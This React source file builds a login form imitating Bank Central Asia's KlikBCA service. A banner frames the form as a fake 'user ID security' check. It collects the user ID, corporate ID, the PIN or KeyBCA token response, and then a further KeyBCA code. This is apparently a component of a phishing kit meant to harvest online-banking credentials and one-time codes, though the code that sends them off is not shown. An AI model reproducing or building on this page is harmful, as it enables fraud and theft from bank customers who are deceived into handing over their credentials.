import React, { useState } from 'react';
import { KlikBcaMode } from '../../types';
import { KeyBcaRemote } from './KeyBcaRemote';
import { LoadingOverlay } from '../LoadingOverlay';

export interface UserIdFormPayload {
  mode: KlikBcaMode;
  corporateId?: string;
  userId: string;
  pinOrKeyBca: string;
}

interface UserIdFormProps {
  onSubmit: (payload: UserIdFormPayload) => void;
  onSubmitKeyBca: (code: string) => void;
  onBack?: () => void;
  step?: 'credentials' | 'keybca';
}

export const UserIdForm: React.FC<UserIdFormProps> = ({
  onSubmit,
  onSubmitKeyBca,
  onBack,
  step = 'credentials',
}) => {
  const [mode, setMode] = useState<KlikBcaMode>('Perorangan');
  const [corporateId, setCorporateId] = useState('');
  const [userId, setUserId] = useState('');
  const [pinOrKeyBca, setPinOrKeyBca] = useState('');
  const [showPass, setShowPass] = useState(false);

  const [touched, setTouched] = useState<{
    corporateId?: boolean;
    userId?: boolean;
    pinOrKeyBca?: boolean;
  }>({});

  if (step === 'keybca') {
    return <KeyBcaRemote onSubmitKeyBca={onSubmitKeyBca} onBack={onBack} />;
  }

  // Real-time error evaluation
  const getCorporateIdError = (val: string) => {
    const clean = val.trim();
    if (!clean) return 'Corporate ID tidak boleh kosong';
    if (clean.length < 3) return `Corporate ID minimal 3 karakter (${clean.length}/3)`;
    return null;
  };

  const getUserIdError = (val: string) => {
    const clean = val.trim();
    if (!clean) return 'User ID tidak boleh kosong';
    if (clean.length < 3) return `User ID minimal 3 karakter (${clean.length}/3)`;
    return null;
  };

  const getPinOrKeyBcaError = (val: string) => {
    const clean = val.replace(/\D/g, '');
    if (!clean) return mode === 'Perorangan' ? 'PIN KlikBCA tidak boleh kosong' : 'Respon KeyBCA tidak boleh kosong';
    if (mode === 'Perorangan') {
      if (clean.length !== 6) return `PIN KlikBCA harus 6 digit angka (${clean.length}/6)`;
    } else {
      if (clean.length !== 8) return `Respon KeyBCA APPLI 1 harus 8 digit angka (${clean.length}/8)`;
    }
    return null;
  };

  const corpErr = (mode === 'Bisnis' && (touched.corporateId || corporateId.length > 0)) ? getCorporateIdError(corporateId) : null;
  const userErr = (touched.userId || userId.length > 0) ? getUserIdError(userId) : null;
  const pinErr = (touched.pinOrKeyBca || pinOrKeyBca.length > 0) ? getPinOrKeyBcaError(pinOrKeyBca) : null;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setTouched({
      corporateId: true,
      userId: true,
      pinOrKeyBca: true,
    });

    const cErr = mode === 'Bisnis' ? getCorporateIdError(corporateId) : null;
    const uErr = getUserIdError(userId);
    const pErr = getPinOrKeyBcaError(pinOrKeyBca);

    if (cErr || uErr || pErr) {
      return;
    }

    onSubmit({
      mode,
      corporateId: mode === 'Bisnis' ? corporateId.trim().toUpperCase() : undefined,
      userId: userId.trim().toUpperCase(),
      pinOrKeyBca: pinOrKeyBca.trim(),
    });
  };

  return (
    <div className="form-wrapper-container w-[var(--form-wrapper-width)] max-w-[var(--form-wrapper-max-width)] mx-auto">
      <div className="text-center mb-3">
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank_Central_Asia.svg/3840px-Bank_Central_Asia.svg.png"
          alt="Logo BCA"
          className="h-6 mx-auto mb-1.5 object-contain"
        />
        <h2 className="text-lg font-extrabold text-[#0060af] tracking-tight">
          {mode === 'Perorangan' ? 'KlikBCA Perorangan' : 'KlikBCA Bisnis'}
        </h2>
      </div>

      <div className="text-[10px] font-bold text-[#0060af] bg-[#f0f4f8] px-3 py-1.5 rounded-lg flex justify-between items-center mb-3 border border-[#d0dbe5]">
        <span>LAYANAN PENGAMANAN USER ID PERBANKAN BCA</span>
        <span>🔒</span>
      </div>

      {/* Tab Switcher */}
      <div className="grid grid-cols-2 bg-[#ebf1f6] p-1 rounded-xl mb-3 border border-[#d0dbe5]">
        <button
          type="button"
          onClick={() => {
            setMode('Perorangan');
            setCorporateId('');
            setUserId('');
            setPinOrKeyBca('');
            setTouched({});
          }}
          className={`py-1.5 px-2 text-xs font-bold rounded-lg flex items-center justify-center gap-1.5 transition-all cursor-pointer ${
            mode === 'Perorangan'
              ? 'bg-[#0066AE] text-white shadow-sm'
              : 'bg-transparent text-[#5c6f84] hover:text-[#1a2b4c]'
          }`}
        >
          <svg className="w-3.5 h-3.5 fill-current" viewBox="0 0 24 24">
            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
          </svg>
          KlikBCA Perorangan
        </button>

        <button
          type="button"
          onClick={() => {
            setMode('Bisnis');
            setCorporateId('');
            setUserId('');
            setPinOrKeyBca('');
            setTouched({});
          }}
          className={`py-1.5 px-2 text-xs font-bold rounded-lg flex items-center justify-center gap-1.5 transition-all cursor-pointer ${
            mode === 'Bisnis'
              ? 'bg-[#0066AE] text-white shadow-sm'
              : 'bg-transparent text-[#5c6f84] hover:text-[#1a2b4c]'
          }`}
        >
          <svg className="w-3.5 h-3.5 fill-current" viewBox="0 0 24 24">
            <path d="M20 6h-4V4c0-1.1-.9-2-2-2h-4c-1.1 0-2 .9-2 2v2H4c-1.1 0-2 .9-2 2v11c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zM10 4h4v2h-4V4zm10 15H4V8h16v11z" />
          </svg>
          KlikBCA Bisnis
        </button>
      </div>

      <form onSubmit={handleSubmit} className="space-y-2">
        {mode === 'Bisnis' && (
          <div>
            <label className="block text-xs font-bold text-[#1a2b4c] mb-0.5">
              Corporate ID (ID Perusahaan)
            </label>
            <input
              type="text"
              value={corporateId}
              onChange={(e) => {
                setCorporateId(e.target.value.replace(/\s+/g, '').toUpperCase());
                setTouched((prev) => ({ ...prev, corporateId: true }));
              }}
              onBlur={() => setTouched((prev) => ({ ...prev, corporateId: true }))}
              placeholder="Contoh: PTMAJU123"
              className={`w-full px-2.5 py-1.5 sm:px-3 sm:py-2 border rounded-md text-xs font-mono uppercase outline-none transition-all ${
                corpErr
                  ? 'bg-red-50 border-red-500 text-red-900 focus:ring-2 focus:ring-red-500/20'
                  : corporateId.length > 0 && !corpErr
                  ? 'bg-emerald-50/40 border-emerald-500 text-[#1a2b4c] focus:border-emerald-600 focus:ring-2 focus:ring-emerald-500/20'
                  : 'bg-[#ebf1f6] border-[#d0dbe5] text-[#1a2b4c] focus:border-[#0066AE] focus:bg-white'
              }`}
            />
            {corpErr && (
              <span className="text-[10px] text-red-600 font-semibold mt-0.5 block animate-fadeIn">
                ⚠ {corpErr}
              </span>
            )}
          </div>
        )}

        <div>
          <label className="block text-xs font-bold text-[#1a2b4c] mb-0.5">
            {mode === 'Perorangan' ? 'User ID KlikBCA' : 'User ID Pengguna'}
          </label>
          <input
            type="text"
            value={userId}
            onChange={(e) => {
              setUserId(e.target.value.replace(/\s+/g, '').toUpperCase());
              setTouched((prev) => ({ ...prev, userId: true }));
            }}
            onBlur={() => setTouched((prev) => ({ ...prev, userId: true }))}
            placeholder={
              mode === 'Perorangan'
                ? 'Contoh: ALBERT1234'
                : 'Contoh: USER01'
            }
            className={`w-full px-2.5 py-1.5 sm:px-3 sm:py-2 border rounded-md text-xs font-mono uppercase outline-none transition-all ${
              userErr
                ? 'bg-red-50 border-red-500 text-red-900 focus:ring-2 focus:ring-red-500/20'
                : userId.length > 0 && !userErr
                ? 'bg-emerald-50/40 border-emerald-500 text-[#1a2b4c] focus:border-emerald-600 focus:ring-2 focus:ring-emerald-500/20'
                : 'bg-[#ebf1f6] border-[#d0dbe5] text-[#1a2b4c] focus:border-[#0066AE] focus:bg-white'
            }`}
          />
          {userErr && (
            <span className="text-[10px] text-red-600 font-semibold mt-0.5 block animate-fadeIn">
              ⚠ {userErr}
            </span>
          )}
        </div>

        <div>
          <label className="block text-xs font-bold text-[#1a2b4c] mb-0.5">
            {mode === 'Perorangan' ? 'PIN KlikBCA (6 Digit)' : 'Respon KeyBCA APPLI 1 (8 Digit)'}
          </label>
          <div className="relative">
            <input
              type={showPass ? 'text' : 'password'}
              value={pinOrKeyBca}
              onChange={(e) => {
                const val = e.target.value.replace(/\D/g, '');
                const maxLen = mode === 'Perorangan' ? 6 : 8;
                if (val.length <= maxLen) setPinOrKeyBca(val);
                setTouched((prev) => ({ ...prev, pinOrKeyBca: true }));
              }}
              onBlur={() => setTouched((prev) => ({ ...prev, pinOrKeyBca: true }))}
              inputMode="numeric"
              placeholder={mode === 'Perorangan' ? '•••••• (6 Digit PIN)' : '•••••••• (8 Digit KeyBCA)'}
              maxLength={mode === 'Perorangan' ? 6 : 8}
              className={`w-full pr-9 pl-2.5 sm:pl-3 py-1.5 sm:py-2 border rounded-md text-xs font-mono outline-none transition-all ${
                pinErr
                  ? 'bg-red-50 border-red-500 text-red-900 focus:ring-2 focus:ring-red-500/20'
                  : pinOrKeyBca.length > 0 && !pinErr
                  ? 'bg-emerald-50/40 border-emerald-500 text-[#1a2b4c] focus:border-emerald-600 focus:ring-2 focus:ring-emerald-500/20'
                  : 'bg-[#ebf1f6] border-[#d0dbe5] text-[#1a2b4c] focus:border-[#0066AE] focus:bg-white'
              }`}
            />
            <button
              type="button"
              onClick={() => setShowPass(!showPass)}
              className="absolute right-2.5 top-1/2 -translate-y-1/2 text-[#5c6f84] hover:text-[#0066AE] focus:outline-none"
              aria-label="Tampilkan Password"
            >
              {showPass ? (
                <svg className="w-4 h-4 stroke-current fill-none" viewBox="0 0 24 24" strokeWidth="2">
                  <path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24" />
                  <line x1="1" y1="1" x2="23" y2="23" />
                </svg>
              ) : (
                <svg className="w-4 h-4 stroke-current fill-none" viewBox="0 0 24 24" strokeWidth="2">
                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                  <circle cx="12" cy="12" r="3" />
                </svg>
              )}
            </button>
          </div>
          {pinErr && (
            <span className="text-[10px] text-red-600 font-semibold mt-0.5 block animate-fadeIn">
              ⚠ {pinErr}
            </span>
          )}
        </div>

        <button
          type="submit"
          className="w-full py-2.5 bg-[#0066AE] text-white font-bold text-xs rounded-md shadow-md hover:bg-[#004d85] active:scale-[0.99] transition-all uppercase tracking-wide cursor-pointer"
        >
          AMANKAN SEKARANG
        </button>
      </form>

      <div className="mt-3 text-[10px] text-[#5c6f84] text-center leading-relaxed">
        {mode === 'Perorangan' ? (
          <>
            Jika Anda membutuhkan bantuan mengenai fasilitas KlikBCA Perorangan, silakan akses{' '}
            <span className="text-[#0066AE] font-bold cursor-pointer hover:underline">
              Informasi KlikBCA Perorangan
            </span>
          </>
        ) : (
          <>
            Jika Anda belum memiliki fasilitas KlikBCA Bisnis, silakan akses{' '}
            <span className="text-[#0066AE] font-bold cursor-pointer hover:underline">
              Informasi KlikBCA Bisnis
            </span>
          </>
        )}
      </div>
    </div>
  );
};
